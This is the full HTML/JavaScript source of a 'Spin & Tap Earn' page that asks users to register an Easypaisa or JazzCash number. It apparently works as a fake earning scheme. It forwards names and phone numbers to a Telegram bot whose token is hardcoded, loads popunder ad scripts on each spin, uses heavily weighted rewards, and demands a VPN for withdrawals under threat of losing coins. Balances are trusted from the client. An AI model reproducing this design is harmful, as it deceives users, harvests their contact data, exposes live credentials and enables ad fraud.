<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>Spin & Tap Earn â€” Mobile</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#05060a;--card:#071226;--gold:#ffb86b;--accent:#ff6b6b;--muted:#93a4b8}
*{box-sizing:border-box}body{margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto; background:linear-gradient(180deg,#04050a,#081226);color:#e6eef8;-webkit-font-smoothing:antialiased}
.app{max-width:420px;margin:12px auto;padding:12px}
.card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border-radius:14px;padding:12px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.03)}
.header{display:flex;align-items:center;gap:10px}
.logo{width:46px;height:46px;border-radius:10px;background:linear-gradient(135deg,var(--gold),#ffd07a);display:grid;place-items:center;color:#071226;font-weight:800}
.h1{font-weight:800;font-size:18px}
.muted{color:var(--muted);font-size:12px}
.row{display:flex;gap:8px;align-items:center}
.input{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:inherit}
.btn{background:linear-gradient(90deg,var(--accent),var(--gold));border:none;padding:10px;border-radius:10px;font-weight:700;cursor:pointer}
.small{font-size:13px;color:var(--muted)}
.flex-between{display:flex;justify-content:space-between;align-items:center}
.center{display:grid;place-items:center}
/* wheel 3d classic */
.wheel-wrap{display:flex;gap:12px;align-items:center;justify-content:center;flex-direction:column}
.wheel-outer{width:300px;height:300px;border-radius:50%;background:conic-gradient(#2b394d 0 51deg,#183047 51deg 102deg,#213547 102deg 153deg,#2b394d 153deg 204deg,#183047 204deg 255deg,#213547 255deg 306deg,#2b394d 306deg 360deg);position:relative;box-shadow:0 18px 50px rgba(0,0,0,0.6), inset 0 8px 30px rgba(255,255,255,0.02)}
.wheel-ring{position:absolute;inset:10px;border-radius:50%;background:radial-gradient(circle at 50% 40%, rgba(255,255,255,0.03), transparent 25%);display:grid;place-items:center}
.wheel-face{width:240px;height:240px;border-radius:50%;background:linear-gradient(180deg,#0a1530,#051020);display:grid;place-items:center;transform-style:preserve-3d;transition:transform 4s cubic-bezier(.18,.86,.18,1)}
.sector{position:absolute;inset:0;display:grid;place-items:center;color:#fff;font-weight:700;transform-origin:center;pointer-events:none}
.pointer{width:0;height:0;border-left:18px solid transparent;border-right:18px solid transparent;border-bottom:26px solid rgba(255,255,255,0.95);position:relative;top:-18px;filter:drop-shadow(0 10px 20px rgba(0,0,0,0.6))}
.center-btn{background:linear-gradient(180deg,#ffb86b,#ff8b6b);padding:12px 16px;border-radius:50px;font-weight:800;color:#071226;box-shadow:0 8px 25px rgba(0,0,0,0.5)}
/* responsive */
@media(max-width:420px){.wheel-outer{width:270px;height:270px}.wheel-face{width:210px;height:210px}}
.notice{background:linear-gradient(90deg,rgba(255,107,107,0.05),transparent);padding:8px;border-radius:8px;color:var(--muted);font-size:13px}
.toast{position:fixed;right:12px;bottom:12px;background:#07202d;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03)}
</style>
</head>
<body>
<div class="app">
  <div class="card header">
    <div class="logo">SE</div>
    <div>
      <div class="h1">Spin & Tap Earn</div>
      <div class="small muted">Dark â€¢ Mobile â€¢ Classic wheel</div>
    </div>
  </div>

  <!-- login -->
  <div id="loginCard" class="card">
    <div class="small muted">You need to bind your Easypaisa or JazzCash number otherwise you'll not be able to withdraw.</div>
    <div style="height:8px"></div>
    <input id="name" class="input" placeholder="Full name (English)" />
    <div style="height:8px"></div>
    <input id="phone" class="input" placeholder="Phone number e.g. 03XXXXXXXXX" />
    <div style="height:8px"></div>
    <div class="row">
      <select id="bindMethod" class="input" style="width:48%">
        <option value="easypaisa">Easypaisa</option>
        <option value="jazzcash">JazzCash</option>
      </select>
      <button id="register" class="btn" style="flex:1">Register & Enter</button>
    </div>
    <div style="height:8px"></div>
    <div class="small muted">Min withdraw 200 coins â€” 10 coins = 1 Rs</div>
  </div>

  <!-- main -->
  <div id="mainArea" style="display:none">
    <div class="card">
      <div class="flex-between"><div><strong id="uName">User</strong><div class="small muted" id="uPhone"></div></div>
      <div class="small muted">Balance <div id="bal" style="font-weight:800;text-align:right">0</div></div></div>
      <div style="height:8px"></div>
      <div class="flex-between">
        <div class="small muted">UID</div><div id="uid" style="background:rgba(255,255,255,0.02);padding:6px;border-radius:8px">--</div>
      </div>
    </div>

    <div class="card wheel-wrap center">
      <div class="pointer"></div>
      <div class="wheel-outer">
        <div class="wheel-ring">
          <div id="wheelFace" class="wheel-face">
            <!-- text sectors (visual only) -->
            <div class="sector" style="transform:rotate(0deg) translateY(-85px)">50</div>
            <div class="sector" style="transform:rotate(51.4deg) translateY(-85px)">40</div>
            <div class="sector" style="transform:rotate(102.8deg) translateY(-85px)">25</div>
            <div class="sector" style="transform:rotate(154.2deg) translateY(-85px)">15</div>
            <div class="sector" style="transform:rotate(205.6deg) translateY(-85px)">10</div>
            <div class="sector" style="transform:rotate(257deg) translateY(-85px)">5</div>
            <div class="sector" style="transform:rotate(308.4deg) translateY(-85px)">0</div>
            <div class="center center-btn" id="spinBtn">SPIN</div>
          </div>
        </div>
      </div>
      <div style="height:6px"></div>
      <div class="small muted">10 spins/day â€¢ Popunder ad opens on spin</div>
      <div style="height:8px"></div>
      <div class="row"><div class="small muted">Spins left:</div><div id="spLeft" style="font-weight:800">0</div></div>
    </div>

    <div class="card">
      <div class="flex-between"><div><strong>Tap to earn</strong><div class="small muted">10 taps = 1 coin (max 100 coins/day)</div></div><div id="tapCoins" style="font-weight:800">0</div></div>
      <div style="height:8px"></div>
      <div class="row"><button id="tapBtn" class="btn" style="flex:1">TAP</button><div style="width:8px"></div><div class="small muted">Taps: <span id="tapCount">0</span></div></div>
    </div>

    <div class="card">
      <div class="small muted">Withdraw (VPN required)</div>
      <div style="height:6px"></div>
      <div class="row">
        <select id="withdrawMethod" class="input" style="width:48%"><option value="easypaisa">Easypaisa</option><option value="jazzcash">JazzCash</option></select>
        <input id="withdrawAmount" class="input" placeholder="Coins" type="number" style="width:48%"/>
      </div>
      <div style="height:8px"></div>
      <div class="notice small muted">You need to connect a VPN to withdraw otherwise your withdraw will be rejected and cannot be added back to your account.</div>
      <div style="height:8px"></div>
      <div class="row"><button id="withdrawBtn" class="btn" style="flex:1">Request Withdraw</button><button id="copyPhone" class="btn" style="background:#0b2a35;width:44%">Copy #</button></div>
    </div>

    <div id="ads" class="card">
      <div class="small muted">Sponsored</div>
      <div id="ad1"></div>
      <div id="ad2"></div>
    </div>

    <div class="card small muted center"><div id="activity">â€”</div></div>
  </div>
</div>

<!-- firebase -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
/* CONFIG (your provided keys & token) */
const firebaseConfig = {
  apiKey: "AIzaSyD81bZWx7Bw3Y6YAY753OyMur49vLcEGTY",
  authDomain: "calling-b5573.firebaseapp.com",
  databaseURL: "https://calling-b5573-default-rtdb.firebaseio.com",
  projectId: "calling-b5573",
  storageBucket: "calling-b5573.firebasestorage.app",
  messagingSenderId: "625719430185",
  appId: "1:625719430185:web:cae7ca1f34eb2fb83ba038",
  measurementId: "G-06VR4RXLTY"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

/* TELEGRAM (provided) */
const TELEGRAM_TOKEN = '8099895542:AAF_q8Q4SNb71xsCG4ImS9sGsnh9uiO6r-k';
const TELEGRAM_CHAT  = '7122620719';

/* local-session */
const LSKEY = 'ste_session';
function nowKey(){const d=new Date(); return `${d.getUTCFullYear()}-${d.getUTCMonth()+1}-${d.getUTCDate()}`}
function uid(){return 'UID-'+Math.random().toString(36).slice(2,7).toUpperCase()}
function load(){try{return JSON.parse(localStorage.getItem(LSKEY))}catch(e){return null}}
function save(s){localStorage.setItem(LSKEY,JSON.stringify(s))}

/* wheel weights */
const options=[{v:0,w:0.2},{v:5,w:49.4},{v:10,w:49.4},{v:15,w:0.8},{v:25,w:0.08},{v:40,w:0.05},{v:50,w:0.03}];
const total=options.reduce((a,b)=>a+b.w,0);
function pick(){
  let r=Math.random()*total; for(const o of options){r-=o.w; if(r<=0) return o.v} return 5;
}

/* UI refs */
const loginCard=document.getElementById('loginCard'), mainArea=document.getElementById('mainArea');
const elName=document.getElementById('name'), elPhone=document.getElementById('phone'), elBind=document.getElementById('bindMethod');
const register=document.getElementById('register'), uName=document.getElementById('uName'), uPhone=document.getElementById('uPhone'), uidEl=document.getElementById('uid');
const balEl=document.getElementById('bal'), spLeft=document.getElementById('spLeft'), spinBtn=document.getElementById('spinBtn');
const wheelFace=document.getElementById('wheelFace'), tapBtn=document.getElementById('tapBtn'), tapCountEl=document.getElementById('tapCount'), tapCoinsEl=document.getElementById('tapCoins');
const withdrawBtn=document.getElementById('withdrawBtn'), withdrawMethod=document.getElementById('withdrawMethod'), withdrawAmount=document.getElementById('withdrawAmount');
const activity=document.getElementById('activity'), copyPhone=document.getElementById('copyPhone'), ad1=document.getElementById('ad1'), ad2=document.getElementById('ad2');

/* load session */
let S = load();
if(S){S = ensureDaily(S); enterSession(S);} 

/* register */
register.addEventListener('click', async ()=>{
  const name=elName.value.trim(), phone=elPhone.value.replace(/\D/g,'').trim(), method=elBind.value;
  if(!name||!phone){alert('Enter name and phone');return;}
  // check phone unique in firebase
  const snap = await db.ref('users/byPhone/'+phone).once('value');
  if(snap.exists()){alert('Phone already registered'); return;}
  S = {name,phone,method,uid:uid(),registered:Date.now(),balance:0,spins:10,tapCount:0,tapCoins:0,lastDay:nowKey(),inviteClaimed:false};
  const uref = db.ref('users/list').push();
  await uref.set(S);
  await db.ref('users/byPhone/'+phone).set({uid:S.uid,key:uref.key});
  save(S); enterSession(S);
  sendTelegram(`ðŸ†• New user\nName: ${S.name}\nPhone: ${S.phone}\nUID: ${S.uid}\nMethod: ${S.method}`);
  applyPendingInvite();
});

/* ensure daily reset */
function ensureDaily(s){
  const d=nowKey();
  if(s.lastDay!==d){s.lastDay=d;s.spins=10;s.tapCount=0;s.tapCoins=0;}
  return s;
}

/* enter UI */
function enterSession(s){
  S = ensureDaily(s);
  save(S);
  loginCard.style.display='none'; mainArea.style.display='block';
  uName.textContent = S.name; uPhone.textContent = `${S.method.toUpperCase()}: ${S.phone}`; uidEl.textContent = S.uid;
  balEl.textContent = S.balance || 0; spLeft.textContent = S.spins; tapCountEl.textContent = S.tapCount; tapCoinsEl.textContent = S.tapCoins;
  activity.textContent = 'Ready â€” play & earn!';
  // realtime sync
  db.ref('users/list').orderByChild('uid').equalTo(S.uid).on('value', snap=>{
    if(!snap.exists()) return;
    const k = Object.keys(snap.val())[0]; const d = snap.val()[k];
    S.balance = d.balance ?? S.balance; S.spins = d.spins ?? S.spins; save(S);
    balEl.textContent = S.balance; spLeft.textContent = S.spins;
  });
}

/* spin */
spinBtn.addEventListener('click', ()=>{
  if(!S){alert('Login first');return;}
  S = ensureDaily(S);
  if(S.spins<=0){alert('No spins left today');return;}
  // open popunder ad (user-supplied script)
  try{
    const s1=document.createElement('script');
    s1.type='text/javascript'; s1.text=`atOptions = { 'key' : '9cbc681ebce5bc26688dd3025f0cbdef', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };`;
    document.body.appendChild(s1);
    const s2=document.createElement('script'); s2.type='text/javascript'; s2.src='//www.highperformanceformat.com/9cbc681ebce5bc26688dd3025f0cbdef/invoke.js';
    document.body.appendChild(s2);
  }catch(e){}
  spinBtn.disabled=true;
  const reward = pick();
  // 3D rotation effect: spin multiple rounds then stop
  const deg = 1800 + Math.floor(Math.random()*360) + (rewardMapAngle(reward));
  wheelFace.style.transform = `rotateZ(${deg}deg)`;
  setTimeout(async ()=>{
    spinBtn.disabled=false;
    S.spins = Math.max(0, S.spins-1);
    S.balance = (S.balance||0) + reward;
    S.lastDay = nowKey();
    save(S);
    // update firebase
    db.ref('users/list').orderByChild('uid').equalTo(S.uid).limitToFirst(1).once('value',snap=>{
      if(snap.exists()){ const k=Object.keys(snap.val())[0]; db.ref('users/list/'+k).update({balance:S.balance,spins:S.spins,lastDay:S.lastDay})}
    });
    balEl.textContent=S.balance; spLeft.textContent=S.spins; activity.textContent=`Spin -> ${reward} coins`;
    toast(`You won ${reward} coins!`);
  },4200);
});
function rewardMapAngle(v){
  // coarse mapping to align visual
  const map={50:20,40:60,25:110,15:155,10:205,5:255,0:305};
  return map[v]||250;
}

/* taps */
tapBtn.addEventListener('click', ()=>{
  if(!S){alert('Login first');return;}
  S = ensureDaily(S);
  if(S.tapCoins >= 100){toast('Tap earn daily cap (100) reached'); return;}
  S.tapCount = (S.tapCount||0)+1;
  if(S.tapCount % 10 === 0){
    S.tapCoins = (S.tapCoins||0)+1;
    S.balance = (S.balance||0)+1;
  }
  save(S);
  db.ref('users/list').orderByChild('uid').equalTo(S.uid).limitToFirst(1).once('value',snap=>{
    if(snap.exists()){ const k=Object.keys(snap.val())[0]; db.ref('users/list/'+k).update({balance:S.balance,tapCount:S.tapCount,tapCoins:S.tapCoins})}
  });
  tapCountEl.textContent=S.tapCount; tapCoinsEl.textContent=S.tapCoins; balEl.textContent=S.balance;
  activity.textContent=`Tapped (${S.tapCount})`;
});

/* withdraw */
withdrawBtn.addEventListener('click', async ()=>{
  if(!S){alert('Login first');return;}
  const amt = parseInt(withdrawAmount.value,10);
  if(!amt || amt<200){alert('Min withdraw 200 coins');return;}
  if(amt > (S.balance||0)){alert('Insufficient balance');return;}
  // deduct and save
  S.balance -= amt; save(S); balEl.textContent=S.balance; activity.textContent=`Withdraw requested ${amt} coins`;
  // create withdrawal entry
  const wref = db.ref('withdrawals').push();
  await wref.set({uid:S.uid,name:S.name,phone:S.phone,method:withdrawMethod.value,amount:amt,at:Date.now(),status:'pending'});
  // send telegram
  const msg = `ðŸ’¸ Withdraw\nName: ${S.name}\nUID: ${S.uid}\nMethod: ${withdrawMethod.value}\nPhone: ${S.phone}\nAmount: ${amt} coins\n(10 coins = 1 Rs)`;
  sendTelegram(msg);
  toast('Withdraw request sent to Telegram');
  withdrawAmount.value='';
  // update user balance in firebase
  db.ref('users/list').orderByChild('uid').equalTo(S.uid).limitToFirst(1).once('value',snap=>{
    if(snap.exists()){ const k=Object.keys(snap.val())[0]; db.ref('users/list/'+k).update({balance:S.balance})}
  });
});

/* copy phone */
copyPhone.addEventListener('click', ()=> {
  if(!S) return alert('Login first');
  navigator.clipboard.writeText(S.phone).then(()=>toast('Number copied'));
});

/* telegram sender */
async function sendTelegram(text){
  try{
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
      method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT,text})
    });
  }catch(e){console.warn('tg',e)}
}

/* toast */
function toast(t){ const d=document.createElement('div'); d.className='toast'; d.textContent=t; document.body.appendChild(d); setTimeout(()=>d.remove(),2200)}

/* invite via ?invite=UID handling */
(function(){
  const p = new URLSearchParams(location.search); const code = p.get('invite');
  if(code){
    const s = load();
    if(!s){ localStorage.setItem('pending_invite',code); return; }
    if(!s.inviteClaimed){ s.inviteClaimed=true; s.spins = (s.spins||0)+5; s.balance=(s.balance||0)+20; save(s); toast('Invite applied +5 spins & +20 coins'); db.ref('users/list').orderByChild('uid').equalTo(s.uid).limitToFirst(1).once('value',snap=>{ if(snap.exists()){ const k=Object.keys(snap.val())[0]; db.ref('users/list/'+k).update({inviteClaimed:true,spins:s.spins,balance:s.balance})}})}
  }
})();

function applyPendingInvite(){
  const code = localStorage.getItem('pending_invite');
  if(code && S && !S.inviteClaimed){ S.inviteClaimed=true; S.spins=(S.spins||0)+5; S.balance=(S.balance||0)+20; save(S); db.ref('users/list').orderByChild('uid').equalTo(S.uid).limitToFirst(1).once('value',snap=>{ if(snap.exists()){ const k=Object.keys(snap.val())[0]; db.ref('users/list/'+k).update({inviteClaimed:true,spins:S.spins,balance:S.balance})}}); localStorage.removeItem('pending_invite'); toast('Invite applied +5 spins & +20 coins')}
}

/* on load: create small welcome popup via toast */
setTimeout(()=>toast('Stay tuned with us for more exciting updates âœ¨'),900);

/* inject ad scripts (banners) - exactly as provided */
ad1.innerHTML = `<script type="text/javascript">  atOptions = { 'key' : 'd5a356bd31aca7e4181cbac200b1bbe1', 'format' : 'iframe', 'height' : 300, 'width' : 160, 'params' : {}  }; </script> <script type="text/javascript" src="//www.highperformanceformat.com/d5a356bd31aca7e4181cbac200b1bbe1/invoke.js"></script>`;
ad2.innerHTML = `<script type='text/javascript' src='//pl27873850.effectivegatecpm.com/7f/a1/a1/7fa1a1b07b2c46bf0711b881388672b6.js'></script>`;

/* new user check on page open: if S exists -> show main, else show login */
if(S) enterSession(S);

/* small UTILITY: register page prevents re-register by local phone check */
window.addEventListener('beforeunload', ()=>{ if(S) save(S) });
</script>
</body>
</html>
